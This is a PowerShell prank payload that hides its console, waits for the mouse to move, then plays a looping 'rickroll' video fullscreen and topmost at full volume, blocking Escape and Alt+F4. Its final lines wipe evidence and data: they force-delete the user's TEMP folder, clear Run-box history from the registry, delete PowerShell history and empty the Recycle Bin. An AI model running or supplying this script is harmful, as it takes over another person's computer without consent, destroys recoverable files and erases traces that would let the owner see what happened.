$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
add-type -name win -member $i -namespace native;
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
function Target-Comes {
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell
    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}
#############################################################################################################################################
#WPF Library for Playing Movie and some components
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.ComponentModel
#XAML File of WPF as windows for playing movie - FIXED: Removed event attributes from MediaElement to avoid parse errors
[xml]$XAML = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="PowerShell Video Player" WindowState="Maximized" ResizeMode="NoResize" WindowStartupLocation="CenterScreen"
        WindowStyle="None" Topmost="True" AllowsTransparency="True">
    <Grid>
        <MediaElement Stretch="Fill" Name="VideoPlayer" LoadedBehavior="Manual" UnloadedBehavior="Stop" />
        <TextBlock Name="ErrorText" Text="Loading Video..." Foreground="White" FontSize="24" HorizontalAlignment="Center" 
                   VerticalAlignment="Center" Visibility="Collapsed" />
    </Grid>
</Window>
"@
#Movie Path - FIXED for flat extract: $env:TMP\rr\rr.mp4
$videoPath = "$env:TMP\rr\rr.mp4".Replace('\', '/')
$VideoSource = New-Object Uri("file:///$videoPath")
#Load XAML
$XAMLReader=(New-Object System.Xml.XmlNodeReader $XAML)
$Window=[Windows.Markup.XamlReader]::Load( $XAMLReader )
$VideoPlayer = $Window.FindName("VideoPlayer")
$ErrorText = $Window.FindName("ErrorText")
#Video Default Setting
$VideoPlayer.Volume = 100
$VideoPlayer.Source = $VideoSource
# Event Handlers (loop video + error fallback) - Added after load, no XAML attributes needed
$VideoPlayer.add_MediaEnded({
    $this.Position = [TimeSpan]::Zero
    $this.Play()
})
$VideoPlayer.add_MediaFailed({
    $ErrorText.Visibility = 'Visible'
    $ErrorText.Text = "Error loading media... (But you're still rickrolled!)"
})
# Trap closing (ignore ESC, etc. - user needs Task Manager)
$Window.add_KeyDown({
    if ($_.Key -eq 'Escape' -or ($_.SystemKey -eq 'Alt' -and $_.Key -eq 'F4')) {
        $_.Handled = $true
    }
})
Target-Comes
$VideoPlayer.Play()
#Show Up the Window
$Window.ShowDialog() | out-null
# Turn off capslock if left on
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
if ($caps -eq $true){$key = New-Object -ComObject WScript.Shell;$key.SendKeys('{CapsLock}')}
# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
# Delete powershell history
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue